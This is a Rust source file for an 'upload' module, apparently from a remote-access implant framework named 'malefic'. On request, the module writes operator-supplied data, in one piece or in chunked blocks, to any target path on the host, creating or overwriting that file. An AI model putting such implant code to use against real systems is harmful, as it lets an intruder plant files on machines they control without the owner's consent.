// #[allow(non_snake_case)]
use futures::SinkExt;
use std::fs::OpenOptions;
use std::io::Write;

use crate::prelude::*;

pub struct Upload {}

#[async_trait]
#[module_impl("upload")]
impl Module for Upload {}

#[async_trait]
impl ModuleImpl for Upload {
    async fn run(
        &mut self,
        id: u32,
        receiver: &mut malefic_proto::module::Input,
        sender: &mut malefic_proto::module::Output,
    ) -> ModuleResult {
        let request = check_request!(receiver, Body::UploadRequest)?;

        let target = check_field!(request.target)?;

        let mut file = OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open(target)?;

        if request.data.is_empty() {
            // data为空，不执行任何操作或进行特定处理
        } else {
            file.write_all(&request.data)?;
            return Ok(TaskResult::new_with_ack(id, 0));
        }
        let _ = sender.send(TaskResult::new_with_ack(id, 0)).await?;
        loop {
            let block = check_request!(receiver, Body::Block)?;
            let _ = file.write_all(&block.content)?;

            if block.end {
                return Ok(TaskResult::new_with_ack(id, block.block_id));
            } else {
                let _ = sender
                    .send(TaskResult::new_with_ack(id, block.block_id))
                    .await?;
            }
        }
    }
}
